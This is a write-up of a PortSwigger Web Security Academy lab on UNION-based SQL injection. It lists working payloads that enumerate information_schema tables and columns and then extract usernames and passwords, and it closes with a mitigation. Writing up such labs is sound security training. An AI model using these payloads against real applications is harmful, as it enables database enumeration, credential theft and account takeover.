## SQL Injection Attack – Listing the Database Contents on Non-Oracle Databases

Platform: PortSwigger Web Security Academy  
Lab: SQL injection attack, listing the database contents on non-Oracle databases

---

## Vulnerability Type
UNION-based SQL Injection

---

## Description
The application is vulnerable to SQL injection, allowing an attacker to use the UNION operator to interact with the backend database. In this lab, the attacker is able to enumerate the database structure by querying the internal information schema tables.

---

## Payloads Used

```sql
'+UNION+SELECT+'abc','def'--
```

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_xxxxxx'--
```

```sql
'+UNION+SELECT+username_xxxxxx,+password_xxxxxx+FROM+users_xxxxxx--
```

---

## Technical Impact
By querying the information schema, it was possible to enumerate all tables and columns in the database. This allowed identification of the users table and extraction of valid usernames and passwords, fully compromising application authentication.

---

## Risk
An attacker could map the entire database structure and extract sensitive information, leading to account takeover, data breaches, and potential system compromise.

---

## Mitigation
Use prepared statements and parameterized queries to prevent SQL injection. Avoid dynamic SQL construction and implement strict input validation.
